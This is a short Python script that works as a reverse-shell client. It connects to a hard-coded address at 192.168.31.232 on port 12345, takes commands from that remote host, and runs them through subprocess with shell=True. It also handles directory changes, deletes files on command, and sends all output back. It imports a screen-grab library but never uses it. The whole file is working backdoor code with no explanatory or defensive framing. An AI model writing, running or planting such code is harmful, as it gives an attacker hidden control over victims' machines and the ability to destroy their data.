import socket
import subprocess
import os
from PIL import ImageGrab
from time import sleep
from io import BytesIO

host = socket.gethostname()
ipv4_addr = socket.gethostbyname(host)
port = 12345

def main(client):
    current_directory = os.getcwd()

    while True:
        command = str(client.recv(4096).decode())
        if command == 'exit':
            client.close()
            exit(0)
        elif command.startswith("cd "):
            try:
                path = command.split(" ")[1]
                os.chdir(path)
                current_directory = os.getcwd()
                client.send(current_directory.encode())
            except Exception as e:
                client.send(str(e).encode())
        elif command.startswith("del "):
            filename = command.split(" ")[1]
            try:
                os.remove(filename)
                client.send(b"File deleted successfully.")
            except Exception as e:
                client.send(str(e).encode())
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
                client.send(result)
                client.send(str("\n").encode())
            except Exception as e:
                client.send(str(e).encode())

def searchForServer():
    host = socket.gethostname()
    ipv4_addr = socket.gethostbyname(host)
    client.connect(('192.168.31.232', port))

if __name__ == "__main__":
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    searchForServer()
    main(client=client)
